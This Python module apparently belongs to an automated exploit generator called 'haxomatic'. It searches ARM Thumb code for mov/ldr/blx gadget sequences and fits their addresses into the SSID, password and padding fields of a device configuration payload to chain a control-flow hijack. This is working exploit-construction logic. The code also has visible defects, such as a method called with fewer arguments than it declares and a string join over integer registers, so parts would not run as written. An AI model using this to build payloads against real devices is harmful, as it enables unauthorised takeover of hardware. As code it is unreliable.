from dataclasses import dataclass
from enum import Enum, auto
from typing import Dict

import capstone.arm as arm

from haxomatic.codescannerv2 import CodePatternMatch


class PayloadFieldType(Enum):
    PAYLOAD_STRING_FIELD = auto()
    PAYLOAD_END_PADDING = auto()


class PayloadField(Enum):
    SSID = ("ssid", 32, PayloadFieldType.PAYLOAD_STRING_FIELD)
    PASSWORD = ("passwd", 64, PayloadFieldType.PAYLOAD_STRING_FIELD)
    PAYLOAD_PADDING = ("padding", 8, PayloadFieldType.PAYLOAD_END_PADDING)

    def __init__(self, name, max_length, type):
        self.name = name
        self.type = type
        self.max_length = max_length


@dataclass
class RegisterMapResult(object):
    object_pointer_register: int
    payload_field_to_register_map: Dict[PayloadField, int]
    register_to_payload_field_map: Dict[int, PayloadField]


@dataclass
class PayloadFieldTarget(object):
    field: PayloadField
    padding_length_until_target: int


@dataclass
class IntermediateGadgetResult:
    gadget_address: int
    payload_field_target: PayloadFieldTarget


class StageFailureError(Exception):
    def __init__(self, message, stage, step):
        super().__init__(message)
        self.stage = stage
        self.step = step


class IntermediateGadgetFinder(object):
    STAGE_NAME = "IntermediateGadgetStage"

    @dataclass
    class CodeGadgetWithPayload(object):
        gadget: CodePatternMatch
        payload_field_target: PayloadFieldTarget

    def __init__(self, code_scanner):
        # TODO: Type the code scanner correctly
        self.code_scanner = code_scanner

    def find_intermediate_gadget(self, register_map: RegisterMapResult) -> IntermediateGadgetResult:
        MOV_OBJECT_REGEX = r'adds r0, r{0}, #0'
        LOAD_NEXT_TARGET_REGEX = r'ldr r[0-7], \[r{0}, #([0-9]{1,2}|0x[0-9]{1,2})\]'
        CALL_NEXT_TARGET_REGEX = r'blx r[0-7]'
        SEARCH_WINDOW_SIZE = 3

        all_field_map_registers = register_map.payload_field_to_register_map.values()
        object_pointer_reg = register_map.object_pointer_register

        all_field_reg_group = '(' + '|'.join(all_field_map_registers) + ')'
        mov_obj_regex = MOV_OBJECT_REGEX.format(object_pointer_reg)
        load_target_regex = LOAD_NEXT_TARGET_REGEX.format(all_field_reg_group)

        mov_load_call_regex = f'{mov_obj_regex}\s+{load_target_regex}\s+{CALL_NEXT_TARGET_REGEX}'
        load_mov_call_regex = f'{load_target_regex}\s+{mov_obj_regex}\s+{CALL_NEXT_TARGET_REGEX}'

        mov_load_results = self.code_scanner.search(
            mov_load_call_regex, window_size=SEARCH_WINDOW_SIZE)
        load_mov_results = self.code_scanner.search(
            load_mov_call_regex, window_size=SEARCH_WINDOW_SIZE)

        results_with_fields = list(map(lambda r: self.__validate_result_gadget_with_field_target(
            r, register_map), mov_load_results + load_mov_results))
        valid_results_with_fields = list(
            filter(lambda r: r, results_with_fields))

        if not valid_results_with_fields:
            self.__raise_failure_error(
                "No valid intermediate gadgets were found", "searching for intermediate gadgets")

        scored_results = [(self.__calculate_gadget_badness(g), g)
                          for g in valid_results_with_fields]
        best_gadget = sorted(scored_results)[0][1]

        return IntermediateGadgetResult(best_gadget.gadget.start_address, best_gadget.payload_field_target)

    def __validate_result_gadget_with_field_target(self, result, register_map: RegisterMapResult) -> CodeGadgetWithPayload:
        # Size is 3 bytes since the highest byte is always a null byte and it's at
        # the end of the string.
        STRING_GADGET_ADDRESS_SIZE = 3

        load_instr = tuple(
            filter(lambda i: i.id == arm.ARM_INS_LDR, result.matched_instructions))[0]
        blx_instr = tuple(
            filter(lambda i: i.id == arm.ARM_INS_BLX, result.matched_instructions))[0]

        load_reg = load_instr.operands[0].reg
        if load_reg != blx_instr.operands[0].reg:
            return None

        payload_field = register_map.register_to_payload_field_map.get(
            load_reg, None)
        if payload_field is None:
            return None

        payload_field_load_conditions = {
            # For end padding payloads, the displacement has to be either 0 or 4, otherwise it won't fit
            PayloadFieldType.PAYLOAD_END_PADDING: lambda _, i: i.operands[1].disp in [0, 4],
            # For string payloads, the next gadget address must be able to fit in the string
            PayloadFieldType.PAYLOAD_STRING_FIELD: lambda f, i: (
                f.max_length - i.operands[1].disp) >= STRING_GADGET_ADDRESS_SIZE
        }

        if not payload_field_load_conditions[payload_field.type](payload_field, load_instr):
            return None

        return self.CodeGadgetWithPayload(result, PayloadFieldTarget(payload_field, load_instr.operands[1].disp))

    def __calculate_gadget_badness(self, code_gadget: CodeGadgetWithPayload, register_map: RegisterMapResult) -> int:
        return code_gadget.payload_field_target.padding_length_until_target

    def __raise_failure_error(self, message, step):
        raise StageFailureError(message, self.STAGE_NAME, step)
